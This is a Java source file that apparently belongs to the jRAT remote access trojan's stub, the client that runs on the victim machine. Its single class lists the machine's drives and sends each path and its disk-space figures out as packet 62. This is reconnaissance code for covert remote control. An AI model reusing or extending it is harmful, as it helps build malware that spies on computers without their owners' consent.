package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import pro.jrat.common.io.StringWriter;

public class Packet62InitDrives extends AbstractOutgoingPacket {

	private File[] drives;

	public Packet62InitDrives(File[] drives) {
		this.drives = drives;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(drives.length);
		for (File drive : drives) {
			sw.writeLine(drive.getAbsolutePath());
			dos.writeShort((int) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getFreeSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getUsableSpace() / 1024L / 1024L / 1024L));
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 62;
	}

}
